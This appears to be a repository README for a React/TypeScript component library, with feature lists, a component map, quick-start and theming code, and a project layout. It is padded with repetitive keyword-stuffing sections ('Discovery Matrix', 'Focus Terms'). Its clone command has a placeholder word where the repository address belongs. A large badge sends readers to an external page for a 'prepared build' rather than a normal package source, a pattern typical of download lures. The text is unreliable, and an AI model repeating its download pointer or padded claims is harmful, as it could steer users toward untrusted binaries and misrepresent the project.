# Radiant Skin Design System - React Components And Adaptable Themes

<p align="center">
  <img src="logo.png" width="180" alt="Radiant Skin Design System logo">
</p>

Radiant Skin Design System is a TypeScript and React component library for building clear, expressive, and consistent interfaces. It combines reusable controls with a theme layer based on CSS variables, color schemes, typography scales, spacing, radius, shadow, focus, and component variants. The project follows the package-oriented structure of the Radiant component sources while presenting a focused collection that is easy to inspect, extend, and integrate.

The library is designed for teams that want a radiant skin across dashboards, product surfaces, internal tools, and customer-facing applications. Its light and dark color systems provide a practical foundation for a radiant app, while typed theme options keep visual decisions close to the code. The result is a compact radiant collection with familiar React patterns and enough flexibility for product-specific styling.

## Core Capabilities

- **Typed React components.** Button, Card, Input, and Typography expose TypeScript props, overridable element types, structured slots, and `sx` styling.
- **Light and dark schemes.** The theme includes coordinated text, background, divider, focus, and semantic palette values for both interface modes.
- **CSS variable architecture.** `extendTheme` generates variables with the `rad` prefix and supports a custom prefix when the library is embedded in a larger system.
- **Four visual variants.** Plain, outlined, soft, and solid treatments share consistent hover, active, and disabled behavior.
- **Semantic colors.** Primary, neutral, danger, info, success, and warning palettes help teams communicate state without component-specific color logic.
- **Stable design scales.** Typography, radius, shadow, font weight, line height, letter spacing, spacing, and breakpoints live in one theme contract.
- **Accessible interaction states.** Focus-visible behavior, labels, keyboard-friendly controls, loading indicators, and explicit disabled states are represented in component APIs.
- **Composable decorators.** Button and Input accept leading or trailing content without forcing consumers to rebuild internal layouts.
- **Tree-friendly package output.** The source package uses ES modules, generated type declarations, and a side-effect-free package configuration.

![Radiant mark](assets/radiant-mark.svg)

The orange radiant mark reflects the central model of the library: one theme distributes color, shape, type, and interaction decisions across many UI elements. A radiant black surface can use the dark color scheme, a radiant dawn surface can use the light scheme, and a radiant ring can be represented through the shared focus-visible treatment. These labels describe design directions rather than separate runtime packages.

## Component Map

| Area | Included Surface | Practical Role |
| --- | --- | --- |
| Actions | `Button` | Primary actions, loading states, decorators, and full-width controls |
| Content | `Card` | Grouped information with plain, outlined, soft, or solid styling |
| Forms | `Input` | Typed text entry with labels, adornments, size options, and validation states |
| Type | `Typography` | Consistent headings, body copy, subtitles, and display styles |
| Theme | `ThemeProvider`, `CssVarsProvider` | Theme delivery and color-scheme control |
| Tokens | Colors, spacing, radius, shadow, type | Shared values for components and custom layouts |
| Utilities | `styled`, `experimental_sx`, `useThemeProps` | Theme-aware extension points |

The component APIs follow a consistent vocabulary. Sizes normally use `sm`, `md`, and `lg`. Variants use `plain`, `outlined`, `soft`, and `solid`. Colors use semantic palette names instead of fixed visual descriptions. This makes a radiant beauty interface and a data-heavy radiant world dashboard share the same implementation rules even when their final appearance differs.

## Get The Build

### Package Button

[![GET RADIANT SKIN](https://img.shields.io/badge/GET%20RADIANT%20SKIN-FF8000?style=for-the-badge&logoColor=white)](https://radiant-skin.github.io/radiant-skin-design-system/radiant-skin)

Use the package button when you want the prepared build entry. The project expects React, React DOM, Emotion, and the MUI base and system layers used by the copied component sources.

### Source Setup

Use the source workflow when you want to inspect tokens, tune the theme, or build the component package locally.

```powershell
git clone SILKA radiant-skin-design-system
Set-Location radiant-skin-design-system
yarn install
yarn build
```

Node.js 16 or newer is required by the package configuration. Yarn is the expected package manager, and `yarn build` produces the module and declaration output through `tsup`. For active development, run `yarn watch` to rebuild after source changes.

## Quick Start

Create a theme, place the provider near the application root, and then import the components needed by the current view.

```tsx
import * as React from "react";
import {
  Button,
  Card,
  Input,
  ThemeProvider,
  Typography,
  extendTheme,
} from "@intugine-technologies/radiant";

const theme = extendTheme({
  cssVarPrefix: "radiant-skin",
});

export function ProfilePanel() {
  return (
    <ThemeProvider theme={theme}>
      <Card variant="soft" color="primary" size="lg">
        <Typography level="h2">Radiant profile</Typography>
        <Input
          aria-label="Display name"
          placeholder="Display name"
          variant="outlined"
          fullWidth
        />
        <Button variant="solid" color="primary">
          Save changes
        </Button>
      </Card>
    </ThemeProvider>
  );
}
```

This pattern keeps the theme boundary explicit and allows custom layouts to consume the same variables as library components. Button supports start and end decorators, loading placement, full-width presentation, and keyboard focus handling. Card can switch direction with `row`, while Input accepts native form behavior alongside themed slots and decorators.

## Theme Configuration

The default theme defines light and dark color systems, semantic palettes, responsive breakpoints, spacing, and reusable scales. Use `extendTheme` for targeted changes instead of copying an entire palette into application code.

```tsx
const radiantTheme = extendTheme({
  cssVarPrefix: "radiant",
  radius: {
    xs: "4px",
    sm: "8px",
    md: "12px",
    lg: "16px",
    xl: "20px",
  },
  colorSchemes: {
    light: {
      palette: {
        primary: {
          500: "#ff8000",
        },
      },
    },
  },
});
```

> **Theme convention.** Keep shared visual values in the theme and use `sx` for local composition. This preserves predictable variant states and prevents a radiant skin from becoming a set of unrelated one-off styles.

The source uses `rad` as its default CSS variable prefix. A custom prefix is useful when several systems coexist on one page. Palette channels are generated for main, light, and dark values, while variant rules derive the interactive colors used by components. The same mechanism can support restrained radiant energy, warmer radiant heat accents, or a high-contrast radiant barrier between content layers without changing component internals.

## Working With Components

Choose semantic props first, then add local layout through `sx`. A solid primary Button works well for the main action, an outlined neutral Button for a secondary action, and a soft status treatment for lower-emphasis controls. Loading content should include an accessible progress label, and form fields should receive an explicit label through visible text or ARIA attributes.

Cards can group controls vertically or use `row` for compact arrangements. Their size, variant, color, and system props match the broader theme vocabulary. Typography uses display and body font families with named weights, sizes, line heights, and letter spacing. This shared type system helps a radiant company product remain consistent from a small settings panel to a complete radiant world workspace.

![Texture browser icon](assets/texture-browser.svg)

The texture-browser icon illustrates another useful principle from the source collection: visual assets and interface controls should remain small, reusable, and easy to locate. Keep component-specific logic beside the component, but keep shared colors and theme behavior in `src/styles` and `src/colors`.

## Project Layout

```text
.
├── assets/
│   ├── radiant-mark.svg
│   └── texture-browser.svg
├── src/
│   ├── Button/
│   ├── Card/
│   ├── Input/
│   ├── Typography/
│   ├── colors/
│   ├── styles/
│   ├── utils/
│   └── index.ts
├── package.json
├── tsconfig.json
└── tsup.config.ts
```

Component folders contain the implementation, public props, generated class helpers, and an index export. The styles folder contains providers, theme extension, variant utilities, type contracts, and CSS-variable support. The colors folder supplies palette ranges, while utilities hold reusable merge behavior. Root configuration files define TypeScript compilation and package bundling.

## Development Notes

Run `yarn lint` before submitting component changes and `yarn build` before publishing an updated package. Changes to a component prop should be reflected in its public type and index export. Changes to theme tokens should be checked in both light and dark schemes, including hover, active, disabled, and focus-visible states.

Keep additions aligned with the established API surface. Prefer semantic palette values over literal colors, reuse theme radius and spacing, and avoid embedding product-specific content in primitive components. New variants should define all interaction states. New controls should preserve keyboard access and expose a clear path for labels, descriptions, and validation feedback.

## Discovery Matrix

- Radiant skin unifies radiant skin tokens, radiant skin controls, and radiant skin layouts.
- Radiant design system connects radiant design system themes, radiant design system types, and radiant design system utilities.
- Radiant beauty supports radiant beauty palettes, radiant beauty typography, and radiant beauty surfaces.
- Radiant app combines radiant app actions, radiant app forms, and radiant app content.
- Radiant black guides radiant black backgrounds, radiant black contrast, and radiant black controls.
- Radiant dawn guides radiant dawn backgrounds, radiant dawn contrast, and radiant dawn controls.
- Radiant ring aligns radiant ring focus, radiant ring borders, and radiant ring interaction.
- Radiant collection organizes radiant collection components, radiant collection tokens, and radiant collection exports.
- Radiant energy informs radiant energy motion, radiant energy emphasis, and radiant energy feedback.
- Radiant heat informs radiant heat accents, radiant heat warnings, and radiant heat highlights.
- Radiant barrier separates radiant barrier surfaces, radiant barrier layers, and radiant barrier states.
- Radiant world scales radiant world navigation, radiant world content, and radiant world workflows.

## Focus Terms

radiant skin, radiant design system, radiant beauty, radiant app, radiant black, radiant dawn, radiant ring, radiant collection, radiant energy, radiant heat, radiant barrier, radiant world

## License

The package configuration identifies the project as MIT licensed. Keep the license identifier with distributed builds and retain source-level attribution already present in copied files. Project notes, component documentation, and local examples are maintained alongside the implementation without external documentation links.
